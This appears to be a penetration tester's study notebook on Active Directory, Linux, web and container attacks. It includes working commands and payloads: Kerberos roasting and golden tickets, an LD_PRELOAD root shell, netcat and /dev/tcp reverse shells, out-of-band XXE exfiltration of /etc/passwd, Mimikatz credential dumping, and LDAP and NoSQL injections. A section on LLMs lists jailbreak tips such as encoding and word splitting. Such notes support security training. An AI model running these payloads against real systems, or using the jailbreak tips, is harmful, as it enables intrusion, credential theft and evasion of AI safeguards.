When SMB is configured to allow null sessions that do not require authentication, you can connect to IPC$ share and enumerate users, groups, shares, and other sensitive information from the system or domain. rpcclient -U "" <IP> -N # help help # enum users enumdomusers # get password policy getdompwinfo

In Active Directory, RID (Relative Identifier) ranges are used to assign unique identifiers to user and group objects. These RIDs are components of the Security Identifier (SID), which uniquely identifies each object within a domain. Certain RIDs are well-known and standardised. 500 - Admin 501 - Guest 512-514 - Domain Admins, Domain Users and Domain Guests 1000+ - User Accounts for i in $(seq 500 2000); do echo "queryuser $i" | rpcclient -U "" -N <IP> 2>/dev/null | grep -i "User Name"; done nxc smb <ip> -u 'anonymous' -p '' --rid-brute 3000

When you send a Authentication Service Request (AS-REQ) for a TGT without a pre-auth hash, the KDC responds differently depending on whether the account exists: If does not exist, the KDC returns KDC_ERR_C_PRINCIPAL_UNKNOWN. If does exist, the KDC requests pre-authentication. Kerbrute does not trigger account lockouts, but generates noise through Windows Event ID 4768.
# execute kerbrute userenum -d <DOMAIN> --dc <DC_IP> /<PATH_TO_USERS> -o output.txt # filter output grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@<DOMAIN>//' > clean_users.txt

If pre-auth is disabled, KDC returns an encrypted AS-REP blob without confirmation of user's identity. Can be captured and cracked offline to recover user's pass. Search for UF_DONT_REQUIRE_PREAUTH flag.
# dump it impacket-GetNPUsers 221b.local/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass # crack it hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt

# request TGT, create ccache file impacket-getTGT <domain>/<user>:'<password>' -dc-ip <dc_ip> # set env variable export KRB5CCNAME=<ccache_file> # check with nxc nxc smb <ip> -u <user> -k --user-kcache -d <domain> # smbexec impacket-smbexec -k -no-pass <domain>/<user>@<dc_ip> # psexec impacket-psexec <domain>/<user>:'<password>'@<dc_ip>

If you're able to get the KRBTGT pass hash. KRBTGT Hash: e9a9871b93d7b4d73c91665bd6df6e50 Domain SID: S-1-5-21-990021728-513958382-3715561918 # forge impacket-ticketer -nthash <hash> -domain-sid <domain_sid> -domain <domain> <user> # set ccache export KRB5CCNAME=<ccache_file> # connect smbclient.py <domain>/<user>@<server_name>.<domain> -k -no-pass -dc-ip <dc_ip>

Important: NTLM Hash: 32 hex characters. Looks like MD5. Collected by dumping hashes. NetNTLMv2: looks like this user::DOMAIN::challenge:hmac:blob. Collected with responder. NetNTLMv2 can be cracked, but not passed. NTLM Hash can be cracked and passed.
If fails, firewall blocking 445, account doesn't have local admin or SMB signing is enfoced. impacket-psexec -hashes :<hash> 'baskerville'@<target>
Lower noise and privs require than PsExec. evil-winrm -i <target> -u 'john.watson' -H <ntlm_hash>

sudo -l - list sudo -u <user> - run as Check if you can run anything as sudo. If you have write privileges on it, you can injecta /bin/bash to upgrade your shell. If you have write privileges on something that it calls, you can change that files content to a reverse shell.

If you can run something as sudo with env_keep+=LD_PRELOAD you can compile a .so to load before the binary. LD_PRELOAD is a env variable that allows any program to use shared libraries. If the "env_keep" option is enabled, you can generate a shared library that will be loaded and executed before the program is run. LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID. Here is the .c to exploit the preload: #include <stdlib.h> #include <unistd.h> void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); } Compile: gcc -fPIC -shared -o shell.so shell.c -nostartfiles Call: sudo LD_PRELOAD=shell.so <binary>

Docker: Uses namespaces to create an app environment Image: Package with files, configs and everything needed to run a container. Container: Process boxes to "contain" the application and its environment with a docker engine on top of the kernel of the OS. Docker Compose: Allow multiple containers to interact with each other. Dockerfiles: Instructions on how to assemble the image. Docker Server uses sockets to communicate with the client. You can interact with the Docker Server using curl and stuff. This is a good attack vector if misconfigured, because you can remotely stop, start and access Docker containers, if you interact with the socket. /var/run/docker.sock List containers: curl http://<target>:2375/containers/json Stop containers: curl -X POST http://<target>:2375/containers/<container>/stop Create a rogue container: curl -X POST http://<target>:2375/containers/create A dockerfile example: FROM ubuntu:22.04 WORKDIR / RUN touch helloworld.txt docker build -t helloworld . An Apache Webserver dockerfile example: FROM ubuntu:22.04 RUN apt update -y && apt install apache2 -y EXPOSE 80 CMD ["apache2ctl", "-D","FOREGROUND"] docker run -d --name webserver -p 80:80 webserver Each instruction run in its own layer, so chain your commands # Before RUN apt update -y RUN apt upgrade -y RUN apt install apache2 -y # After RUN apt update -y && apt upgrade -y && apt install apache2 -y A docker-compose.yml example: Run one web server and one database server. version: '3.3' services: web: build: ./web networks: - ecommerce ports: - '80:80' database: image: mysql:latest networks: - ecommerce environment: - MYSQL_DATABASE=ecommerce - MYSQL_ROOT_PASSWORD=helloword networks: ecommerce:

Parallel universes of computers: All softwares cast a bunch of parallel universes and only one is intended. The rest are Weird Machines. They run a combination of the real code with the attackers code. Stack overflows Heap overflows Buffer overflows Exploitation is programming a weird machine inside a real machine. Programming a weird machine IS return-oriented programming (ROP). Using existing code fragments to break it.

John the ripper that comes with Kali is too old. To use things like keepass2john in a kdbx 4.0 file you'll need to download and compile john from github. Update and install libs: sudo apt update && sudo apt install -y git build-essential libssl-dev zlib1g-dev pkg-config libgmp-dev libpcap-dev libbz2-dev yasm libcrypto++-dev Clone john repo: git clone https://github.com/openwall/john -b bleeding-jumbo john_latest Compile: cd ~/john_latest/src ./configure && make -s clean && make -sj4 Test: cd ~/john_latest/run ./john --test=0 Now, when you need to run john, I suggest you just make an alias or run it from john_latest/run.

Software Architectures: Monolith -> Single service that do everything (users, payment, delivery). When the demand is high, everything the whole thing needs to grow. Microservices -> Divided system into its functions. When the demand is high, only what is demanded need to grow. Orchestrator of containers. In microservices, when an application starts receiving a lot of traffic, you start a new container with the app to distribute the traffic. When the peak is done, you go back to one container. This control is what Kubernetes does. Helps with availability and scalability. Pod: Group of one or more containers. These containers can share storage and network resources. If the app needs to be scaled up, you increase the number of pods. Cluster: Set of nodes. Nodes: Workloads (applications) are run inside containers that are placed inside a pod. The pods run nodes. There's the control plane ( or master node) and worker nodes. Nodes can be virtual or physical machines. Nodes contain all the services necessary to run pods.

Manages worker nodes and pods in the cluster. Kube-apiserver: Front end of the control plane. Responsable for exposing the Kubernetes API. Etcd: Key/value store with cluster data and its current state. Kube-scheduler: Catch any new pods and assign it to a node. Kube-controller-manager: Runs the controller processes (like node controller to watch nodes status). Interact with the scheduler node to schedule a new node to come up if a node is down. Cloud-controller-manager: Communication between Kubernetes cluster and cloud provider API.

Kubelet: Agent responsible for ensuring the containers are running in a pod. Executes actions given by the controller manager, like starting a pod with a container inside. Kube-proxy: Network communication within the cluster. Traffic won't hit pods, they'll hit a Service associated with a group of pods, and then get directed to one of the associated pods. Container runtime: Docker, rkt, runC. Enables pods to have containers.

Namespaces: It's a way to divide resources in isolated virtual groups. One group has its own resources and can't access other groups resources. ReplicaSet: Set of replica pods. Guarantee the availability of a specific number of identical pods. They're managed by a deployment. Deployment: Stateless management of RepplicaSets. When creating a deployment you can configure it to have a ReplicaSet with n number of pods. StatefulSets: Like deployment, but used for applications that need a persistent identity and stable storage (like dbs, email). It guarantees that each pod gets a predictable name and its own dedicated storage volume. Services: Placed in front of pods acting as an access point. This ensures pods have a single and the same IP and allows for requests to be load-balanced between pod replicas. ClusterIP, LoadBalancer, NodePort and ExternalName, to name a few. Ingress: Manage external access to the services.

apiVersion: Version of K8's API. kind: Object (Deployment, Service, StatefulSet). metadata: Data to identify the object. spec: State of the object. Service: apiVersion: v1 kind: Service metadata: name: nginx-service spec: selector: app: nginx ports: - protocol: TCP port: 8080 targetPort: 80 type: ClusterIP Deployment: apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment spec: replicas: 3 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:<version_tag> ports: - containerPort: 80

System Prompt: Config layer between user and LLM. Instructions for the model. Its like saying to your kid to don't talk to strangers. Prompt Injection: Breaking system prompt. Jailbreaking: Breaking the model it self. Bypassing safety baked into the model during training. Reinforcement Learning from Human Feedback (RLHF): Humans rate model outputs to reward safe responses. Its not rule based as system prompts, its statistical, baked into the training. Multi-Turn Conditioning (Crescendo Attacks): Genuine questions that lead to cooperation, gradually escalate and never state the objective directly. Tips to try to bypass controlls: Encode your things, base64 or 1337. Break words (ha-cking). From the perspective of a Pentester. Threat Modeling Manifesto OWASP Threat Dragon Drawio or Excalidraw - for quick sketch.

What are you working on? Understand the architeture. What can go wrong? Identify threats. What are you going to do about it? Mitigate, eliminate, transfer, or accept risk. Did you do a good enough job? Review, validate, update.

English(Português). Assets (Ativos): Anything of value. Data assets: Information. Anything the system stores, processes and transmits. Personally Identifiable Information (PII), payment info, authentication credentials, transaction logs, to name a few. System assets: Infraestructure that hosts and move the data. Servers, databases, APIs, network devices, and cloud services. The means to reach a data asset. Business process assets: Workflows and processes that if disrupted make the company lose money. Attack Surface (Superfície de Ataque): All potential target points to enter and extract data or interact with the system. Data Flow Diagrams (DFD, Diagrama de Fluxo de Dados): Visual representation of how data moves. External Entity (Entidade Externa): Rectangle -> User, system or service outside of control. Third-party data processor (e.g. payment), client browser. Process (Processo): Circle -> App logic that acts on data. API gateways, webapps. Data Store (Armazenamento de Dados): Parallel lines -> Where data persists at rest. SQL Database, Active Directory, log files. Data Flow (Fluxo de Dados): Arrow -> Direction data moves between components. HTTP request, API call, database query. Trust Boundary: Dashed line -> Border where trust changes. Internet - internal network. Example: [Client] -- HTTPS --> | (WebApp) -- API --> | (API gateway) -- SQL query --> || DATABASE || WebApp Login: [user] -- POST --> | (login) -- check creds --> | (API) -- SQL query --> || DATABASE || [user] <-- OK /home --- | (login) <-- creds valid -- | (API) <-- query results || DATABASE ||
Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege. Helps to minimize inconsistency problems for threat identification.

Violates Authentication Threat actor pretends to be someone (or something) they are not. Authentication bypass with credential theft, session hijacking, IP (or MAC) spoofing, and forged authentication tokens.
Violates Integrity Unauthorized modification of data. Intercepting and altering network traffic (AitM - T1557), manpulating database records, injecting malicious code, or modifying config files.

Violates Non-Repudiation System can't prove that a specific action was performed by a specific actor. Insufficient or easily trampered logs (makes incident response slower and forensics reconstruction difficult).

Violates confidentiality Sensitive data is exposed to unauthorized access. SQL injection data dumps, directory traversal can access configuration files (config.php), error messages and application stacks that reveal internal architecture, and insecure API responses with too much unecessary data.
Violates Availability Make the system unresponsive or unavailable. DDoS, logic bombs (linux fork), targeted crashes with malformed input (sending an emoji to the database).

Violates Authorization Threat actors escalates from a lower privilege to a higher privilege, obtaining access to features and data they were never meant to reach. Broken access controls, kernel vulnerabilities, misconfigured permissions, and application logic flaws.
Process for Attack Simulation and Threat Analysis.
What does the business needs to protect and why. Compliance, customer trust, uptime, data, ...

System, components and technologies. Mapping the architecture, identifying attack surface, making an inventory of the components that supports the business objectives. Guided by Scope and Rules of Engagement (RoE). Everything that appears here should be on Scope and outside of RoE.

How does data move through the system, and where are the trust boundaries. Identify processes, data stores, external entities, data flows, and trust boundaries. The entry points identified here become the initial target list.
Threat intel based on client's industry, geolocation, and technology stack. Gather information about who are the most probable threat actors (and what they target).

Gather vulnerabilities that exists in the target systems, and relate them to the identified threats. Maps known vulnerabilities to the threats identified in Stage 4, Threat Analysis. CVE databases, prior vulnerability scan results, configuration reviews, and publicly disclosed issues affecting the client's technology stack. Here you prioritize what to test, instead of bruteforcing every vulnerability.

How everything chain together into realistic attack paths. Build attack trees to model a complete attack path, from initial access to final objective. Should be heavly based on the client's concerns. "I want to know if an user can escape it's company context and get data from other companies that uses my SaaS". Goal: Exfiltrate data from companies outside of current scope |-- Path A: External | |-- Exploit SQL injections | |-- Attempt to bypass authentication |-- Path B: With access | |-- Harvest app creds from public leaks | |-- Authenticate | |-- Horizontal privilege escalation | |-- Data dump |-- Path C: Internal | |-- Harvest company employees creds | |-- Attempt to access internal network | |-- Attempt to pivot between networks | |-- Find database and query it

Business impact if any of the attack paths succeeds. Quantify business consequences if any of the attack paths succeeds. Its the executive summary of the report. Avoid technical terms, show the real impact. GPDR (LGPD) sanctions potential fines for non-compliance, customers notification, reputational, legal and operational impacts.

Adversarial Tactics, Techniques, and Common Knowledge. Real world observations of adversary behavior. https://attack.mitre.org/ Attack sim. based on Mitre - Atomic Red Team Tactic: Adversary goal. Why the threat actor performs an action. Credential Access (TA0006). Technique: Method. The how. Bruteforce (T1110). Sub-technique: More specific variant of a technique. Brute Force: Credential Stuffing (T1110.004).

TCP 389 TCP 636 Lightweight Directory Access Protocol. It is a protocol for accessing directory services. It helps find organizations, individuals, resources and devices within networks. Microsoft Active Directory uses it to manage domain resources. LDAP Data Interchange Format (LDIF): Plain text data for representing LDAP entries and update operations. LDIF imports and exports directory contents and describes directory modifications such as adding, modifying, or deleting entries. Distinguished Name (DN): Unique identifiers for each entry in the directory. cn=Sherlock Holmes,ou=people,dc=mydomain,dc=local Relative Distinguished Name (RDN): Individual levels within the directory hierarchy. cn=Sherlock Holmes Attributes: Properties of directory entries. mail=sherlock@221b.com

Base DN (Distinguished Name): Starting point in the directory tree. Scope: Defines how deep the search should go from the base DN. base -> search the base DN only. one -> search the immediate children of the base DN. sub -> search the base DN and all its descendants. Filter: Define conditions that entries in the directory must match to be included in the results. Attributes: Which characteristics of the matching entries should be returned in the search results.

Syntax is defined in RFC 4515. Simple -> (cn=Sherlock Holmes) Wildcard -> (cn=S*) Complex -> (&(objectClass=user)(|(cn=Sherlock*)(cn=John*))) ldapsearch -x -H ldap://<ip> -b "dc=mydomain,dc=local" "(ou=People)"

# anon bind ldapsearch -x -H ldap://<ip> -s base # dump everything ldapsearch -x -H ldap://<ip> -b 'dc=example,dc=local' 'objectClass=*' # query users ldapsearch -x -H ldap://<ip> -b "dc=example,dc=local" "(objectClass=person)"

If nothing else worked, try one of these after you cried a little bit. # null scan nmap -sN # fin scan nmap -sF # xmas scan (fin, ack, rst) nmap -sX # this ones are firewall dependent # ack scan nmap -sA # window scan nmap -sW Zombie Scan​ Zombie Scan needs an idle network device. How it works: Sends SYN/ACK to zombie, recieves RST and check the ip id heade Sends SYN/ACK to the real target with the ip spoofed to the zombie ip. If the port is closed, the target sends RST to zombie, and doesn't increment the zombie ip id. If the port is open | filtered, the target sends SYN/ACK to the zombie, incrementing the zombie ip id. Then, the scan checks again the ip header of the idle zombie. If increment is equal 1 -> closed. If increment is equal 2 -> open | filtered nmap -sI <zombie_ip>

search type:payload meterpreter In-Memory Execution: It does not write itself to disk. Payload is injected into an existing running process with a technique called reflective DLL injection, which loads a DLL directly into process memory without registering it through the operating system's normal module-loading API. Encrypted Communication: All traffic is encrypted. May use TLS (HTTPS-based meterpreters) or AES (TCP-based). Both helps with IDS and IPS evasion, but its not bullet proof. Modern EDRs can find it by monitoring process activity patterns and memory scans for known signatures. Windows AMSI 'can' ( ;D ) also detect it.

Singles (inline): Self-contained. The entire payload is delivered in a single package. Larger, but more reliable; no second download. Stagers: Small, lightweight payloads that establish a communication channel between the attacker and the target. Once connected, the stager downloads the second component. Stages: Larger payload components downloaded by a stager. Together, a stager and its stage form a staged payload. Naming Convention: windows/x64/shell_reverse_tcp -> single, uses _ windows/x64/shell/reverse_tcp -> staged, uses /

Payload mismatch: Payload must exactly match what was generated with msfvenom, including architecture and staging type. Network configuration: LHOST must be the correct interface IP, not 0.0.0.0 or localhost. Firewall blocking: Make sure attacking machine's firewall allows inbound connections on the specified LPORT. Privilege requirements: Ports below 1024 need sudo.

Rainbow Tables: Crackstation Hashes Rainbow Tables: Precomputed hashes in a database for fast search. Usually the "dehasher" web sites do this. Rule-Based Attacks: Rule-based attacks take an existing wordlist and apply transformations to each word. Capitalise the first letter: password → Password Append a number: password → password1 Add a special character: password → password! Substitute characters: password → p@ssw0rd Mask Attacks: A mask attack is a structured Brute-force attack in which you define the pattern of the password rather than just the character set. lowercase -> ?l uppercase -> ?u digits -> ?d special -> ?s ascii -> ?a Ex. "Summer2026!" -> ?u?l?l?l?l?l?d?d?d?d?s Tips: No info? rockyou.txt -> Failed? rockyou.txt + best64 Known pattern? Mask attack Short? Brute force (cruch) Company-specific? Custom wordlist + rules cupp is a good tool for generating custom wordlists based on user profile.

Can't be decrypted. It’s meant to be impossible (or computationally impractical) to go from the output back to the input. Good hashing algorithms will be relatively fast to compute and prohibitively slow to reverse. Any changes in the input (single bit) changes the output. Hashing helps protect data’s integrity and ensure password confidentiality. Store only the hash of a password, with a salt appended (salt prevents two passwords to have the same hash, and are unique to the user). The only way to find the original password is to hash a password and see if they match. Hash collision is when 2 or more inputs have the same hash. Password Hashes = hash(password + salt) MD5: 32 hex chars SHA-1: 40 hex chars SHA-256: 64 hex chars NTLM: 32 hex chars bcrypt: ~60 hex chars

Reverse shells: Target can make outbound connections? Firewalls block inbound connections? Target is behind NAT (Network Address Translation) without port forwarding? You want to control the listening port on your own machine? Bind shells: Outbound connections from the target are restricted? You can't accept inbound connections on your host? Target has accessible ports (through firewall rules or port forwarding)? You need multiple people to access the same shell?
Reverse Shell: Target machine connects to attacker with an outbound connection. # attacker opens a listener nc -lvnp 4444 # target connects nc <local_host> 4444 -e /bin/bash
cat > shell.sh << 'EOF' #!/bin/bash bash -i >& /dev/tcp/<LOCALHOST>/<PORT> 0>&1 EOF Remember to set execution privs: chmod +x shell.sh
Bind Shell: Target opens a port and wait connection. # target opens a listener nc -lvnp 4444 -e /bin/bash # attacker connects nc <remote_host> 4444

PayloadAllTheThings Application trusts serialized data and use it without proper validation of authenticity. Code review is the best way to look for it, but behavior analysis can lead to great results too. Appending a ~ to a PHP file can also get you access to backup or temporary files. If you don't have access to the code, exploiting Insecure Deserialization is severily deprioritized. Serialization: Transforming an object's state into a human-readable or binary format. It's essential in applications where data must be transferred across a network. Deserialization: Converting the formatted data back into an object. Remember Log4j (CVE-2021-44228)? Insecure Deserialization. Serialization: "note", "content" => "test note"); $note = serialize($noteArray); file_put_contents('note.txt', $note); ?> //a:2:{s:5:"title";s:4:"note";s:7:"content";s:9:"test note";} Deserialization: "; echo "Content: " . $noteArray['content']; ?> .NET -> Serialization PHP -> Serialize Java -> Serializable Python -> Pickle Ruby -> Marshal

Refer to Network - LDAP for info about LDAP. PayloadAllTheThings Like any other injection, LDAP Injection occurs when user input is not properly sanitized before being incorporated into LDAP queries. Can lead to unauthorized access to sensitive information, modification of directory data, or bypassing authentication mechanisms. It's very similar to SQL injection.

Authentitcation Bypass: Bypass authentication without a password. Unauthorized Data Access: Retrieve sensitive information that you don't have access. Data Manipulation: Add or modify user attributes.

Consider this: (&(uid={userInput})(userPassword={passwordInput})) Attacker could do this to bypass logic: user: *)(|(&) pass: pwd query: (&(uid=*)(|(&)(userPassword=pwd))) Match any uid and make the password match pwd or an empty AND (&), which is considered true in LDAP. Or simply: user: * pass: * query: (&(uid=*)(userPassword=*)) It will always fetch the first result.
Boolean based, a true and false statement have different responses. user: a*)(|(& pass: pwd) query: (&(uid=a*)(|(&)(userPassword=pwd))) Analyze the answers and bruteforce it.

PayloadAllTheThings NoSQLMap MongoDB, NoSQL. Documents: Dictionary structure where key-value pairs are stored. Collections: Multiple documents, grouped by similar function. Like tables in SQL. Databases: Multiple collections, grouped by related collections. Syntax Injection: Break out of the query and inject a payload. This one is the least common because most libraries used to create NoSQL queries apply filters to prevent injection. Operator Injection: If you can't break the query, maybe you can inject a query operator ($ne). For this to happen, you need to pass an array as a POST HTTP request.
PHP and other languages allow you to pass an array. This will login with the first user returned by the database. user=asdasd&pass=asdasd | | user[$ne]=asdasd&pass[$ne]=asdasd

ORM simplifies database access, allows devs to interact with a database using native syntax. It is like a bridge between object-oriented programming and the relational database model. It helps to mitigate SQL Injection. PayloadAllTheThings Common ORM frameworks: Doctrine (PHP). Hibernate (Java Spring). Sequelize (Node.js) Entity Framework (C#). Active Record (Ruby on Rails). The best way to test it is in a known environment (white box) pentest. With a code review, you can look for places where the developers may have used a raw query. If you don't have access to the code, a simple input validation (') or a malformed data to trigger errors may lead to a fingerprint. If you have access to the code, you want to look for this: Eloquent ORM -> whereRaw(), DB::raw() Active Record -> where("name = '#{input}'") Django ORM -> extra(), raw() Hibernate -> createQuery() with concatenation Sequelize -> sequelize.query() If you don't, here are some ways to fingerprint: Verify cookies -> Some cookies will give you info like laravel_session. Review source code of the page -> Maybe the devs left framework commentaries. Analyze headers -> Sometimes it gives you info about server and framework. URL structure -> Some frameworks have an unique routing pattern. Login and error pages -> Some frameworks have distinctive error pages and login form structures.
Basics -> 1' or '1' = '1 Login Bypass -> {"$ne": null} Laravel sort (query_users?sort=name') -> name->"')) LIMIT 10%23

PayloadAllTheThings PortSwigger Server-side prototype pollution: Black-box detection without the DoS - Gareth Heyes In JavaScript, a prototype is a blueprint for objects. When you create an object using a constructor function or a class, JavaScript will set up a link between the object and its prototype. Prototype pollution is a vulnerability that arises when an attacker manipulates an object's prototype, impacting all instances of that object. Objects inherits properties and methods from their prototype. A prototype chain is the links between the objects and their prototypes. When accessing a method or property, JavaScript goes up the chain until it finds it or (null). Object.prototype. is the top of the chain, polluting it affects all objects that inherit from it. This example is from Gareth. let obj = {a:1, b:2}; Object.prototype.c=3; console.log(obj.c); // 3 obj.__proto__ === Object.prototype obj.hasOwnProperty('__proto__'); -> false the __proto__ property is inherited. This is a normal POST json: { username: "elliot", age: "25", } We could try to pollute it: { username: "elliot", age: "25", isAdmin:true } If the user have the property, this would try to change it. If you can't change it, try to insert a random property and see if it reflects back. This would be a prototype pollution: { username: "elliot", age: "25", "__proto__": { "testValue": "pwnd" } }

Based on Gareth Heyes talk. Again, I can't stress this enough, watch the Gareth talk. If you screw up with prototype pollution, you can break something. // test it against an endpoint that takes multiple parameters. {"__proto__":{"parameterLimit":1}} //??foo=bar {"__proto__":{"ignoreQueryPrefix":true}} //?foo.bar=baz {"__proto__":{"allowDots":true}} //{"foo":"+AGIAYQBy-"} {"__proto__":{"content-type":"application/json; charset=utf-7"}} //add spaces in json {"__proto__":{"json spaces":" "}} //Access-Control-Expose-Headers {"__proto__":{"exposedHeaders":["foo"]}} //modify status code {"__proto__":{"status":510}} // OPTIONS {"__proto__":{"head":true}} Reflected properties inside JSON: If you get any of these in the response you either god prototype pollution or object persistence. {"__proto__":"random"} {"__proto__x":"random"}

DON'T Probably will break something // this breaks {"__proto__":{"encoding": "x"}} // this breaks {"__proto__":{"expect": 1337}} // this breaks {"constructor":{"keys": "x"}} // this breaks {"__proto__": {"toString": "Just crash the server"}} // this stores XSS inside the application {"__proto__": {"_body":true,"body":"<script>evil()"}}

For callbacks: interact.sh PayloadAllTheThings - XSS PortSwigger JavaScript code an attacker injects into a web application that runs in another user's browser. Reflected: Non-Persistent. Web app takes user input (query string, form field, ...) and displays it on a page without sanitising it. Stored: Persistent. Web app saves attacker-controlled input on the server and displays it to other users. DOM-Based: Client-side JavaScript reads attacker-controllable data from the DOM (URL, location.hash, location.search, document.referrer, localStorage, etc.) and writes it back into the page in an unsafe way (e.g. innerHTML, document.write, eval). Blind: Stored XSS but you can't see the payload working or test it against yourself. A website has a contact form where you can message a member of staff. The message content isn’t checked for malicious code, allowing the attacker to enter anything they wish. These messages are then turned into support tickets, which staff view on a private web portal. Ensure your playload has a callback like fetch() <script>alert('XSS')</script>

XML External Entity. Microsoft Learn - XML Documents and Data In-band: You can see the response from the server. Just exfiltrate data. Out-of-band: Can't see the response from the server. Alternative channels exfiltration, like DNS or HTTP.

Estensible Markup Language (XML) consist of elements, attributes, and character data. Used for data exchange, storage, and configuration. Often used by web services and APIs (SOAP an REST), to exchange data. Also used for configuration files, like web server configs and application settings. <?xml version="1.0" encoding="UTF-8"?> <user id="1"> <name>elliot</name> <email>elliot@evil.corp</email> </user> <name>, ..., are elements. id="1' is an attribute. elliot is a character data. XSLT: Language used to transform and format XML documents. DTDs (Document Type Definitions): Define the structure and constraints of an XML document. DTD example: <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE config [ <!ELEMENT config (database)> <!ELEMENT database (username, password)> <!ELEMENT username (#PCDATA)> <!ELEMENT password (#PCDATA)> ]> <config> <!-- configuration data --> </config> This is an internal entity: <!DOCTYPE note [ <!ENTITY inf "This is a test."> ]> <note> <info>&inf;</info> </note> This is an external entity: <!DOCTYPE note [ <!ENTITY ext SYSTEM "http://example.com/external.dtd"> ]> <note> <info>&ext;</info> </note> XML Parsers: DOM (Document Object Model) Parser: Builds the entire XML doc into a memory-based tree structure. Allows random access to all parts of the doc. Resource-intensive, but flexible. SAX (Simple API for XML) Parser: Parses sequentially without loading the whole doc into memory. Suitable for large XML files, but less flexible for accessing XML data randomly. StAX (Streaming API for XML) Parser: Like SAX, but the developer have more control over the XML parsing process. XPath Parser: Parses XML based on expression and is used a lot with XSLT.

Request data: <?xml version="1.0" encoding="UTF-8"?> <contact> <name>test</name> <email>test@test.com</email> <message>test message</message> </contact> Piece of vulnerable code: libxml_disable_entity_loader(false); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $xmlData = file_get_contents('php://input'); $doc = new DOMDocument(); $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); $expandedContent = $doc->getElementsByTagName('name')[0]->textContent; echo "Thank you, " .$expandedContent . "! Your message has been received."; } This one extract the name element from the user request xml. So we can define an internal entity call it. Evil XML: <!DOCTYPE evil [ <!ELEMENT evil ANY> <!ENTITY etc SYSTEM "file:///etc/passwd" >]> <contact> <name>&etc;</name> <email>test@test.com</email> <message>test message</message> </contact>

You'll need to be able to catch the request. In a local env you can use a python HTTP server, in a remote env you can use Interactsh from project discovery. Example request: <?xml version="1.0" encoding="UTF-8"?> <upload> <file>http://example.com/uploads/filename.</file> </upload> Piece of vulnerable code: libxml_disable_entity_loader(false); $xmlData = file_get_contents('php://input'); $doc = new DOMDocument(); $doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD); $links = $doc->getElementsByTagName('file'); foreach ($links as $link) { $fileLink = $link->nodeValue; $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())"); $stmt->bind_param("s", $fileLink); $stmt->execute(); if ($stmt->affected_rows > 0) { echo "Link saved successfully."; } else { echo "Error saving link."; } $stmt->close(); } Evil XML: <!DOCTYPE evil [ <!ELEMENT evil ANY> <!ENTITY xxe SYSTEM "http://LOCAL_IP:80/" >]> <upload> <file>&xxe;</file> </upload> If it works, you can create an evil DTD to exfiltrate data. <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://LOCAL_IP:1337/?data=%cmd;'>"> %oobxxe; Declares an entity %cmd that points to a system resource. the PHP filter protocol then retrieves the content of /etc/passwd and encodes it to base64 to avoid formatting problems. The %oobxxe contains another XML entity declaration (exfil) that has a system identifier pointing to your local attack machine with a parameter data with %cmd, representing the encoded content of /etc/passwd. And then, call it. <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE upload SYSTEM "http://LOCAL_IP:1337/evil.dtd"> <upload> <file>&exfil;</file> </upload>
SSRF + XXE <!DOCTYPE evil [ <!ELEMENT evil ANY> <!ENTITY xxe SYSTEM "http://localhost:PORT" >]> <contact> <name>&xxe;</name> <email>test@test.com</email> <message>test message</message> </contact>

XML Entity Expansion involves defining entities withing an XML document, which the XML parser then expands. <!DOCTYPE evil [ <!ELEMENT evil ANY> <!ENTITY msg "This is a test message" >]> <contact> <name>&msg; &msg;</name> <email>test@test.com</email> <message>test message</message> </contact> If this works, you can expand it to make a DoS. This is enough evidence in a Pentest and I'll not go any further with it.

Let's go farming :) Some of these techniques require local admin privileges. The goal is to farm creds for lateral movement. Defenses will scream, so use it wisely. Local Security Authority Subsystem Service (LSASS): Manages authentication and holds sensitive creds min memory. NTLM and LM hashes, Kerberos tickets, and plaintext. Needs SYSTEM-level access. Dumping triggers defender. Mimikatz - sekurlsa::logonpasswords, sekurlsa::minidump. Security Accounts Manager (SAM) + SYSTEM Hives: SAM is a windows registry database that stores pass hashes for local users. Hashes are encrypted, need the BootKey from SYSTEM hive. Mimikatz - lsadump::samvssadmin. SAM - %SystemRoot%\system32\config\SAM SYSTEM - %SystemRoot%zsystem32\config\SYSTEM Local Security Authority (LSA) Secrets: HKLM\SECURITY\Policy\Secrets - cached domain creds for offline logons, cleartext pass for scheduled tasks or services, RDP session pass. Can be accessed by SYSTEM and Admin via Local Security Authority Remote Protocol (LSARPC). secretsdump.py with local admin creds. . Data Protection API (DPAPI): Win crypto service for protecting apps secrets. DPAPI vault defines a mster key per user to encrypt creds (wi-fi pass, browser logins, ...). Master key is encrypted with key derived from user's pass and is stored in %APPDATA%\Microsoft\Protect. Mimikatz - vault::list, vault::cred /export. NTDS.dit: Core AD database, only in DCs. Domain user accounts, computer objects, service principals, NTLM pass hashes and Kerberos key. secretsdump.py -just-dc lsadump::dcsync. MS-Cache v2 (aka DCC2) password hashes. DCC2 hashes are Domain Cached Credentials stored locally on Windows machines.

RogueWinRM Allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user. c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe <LOCAL_HOST> 4442" The exploit may take a little to work The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe <LOCAL_HOST> 4442. nc -lvnp 4442

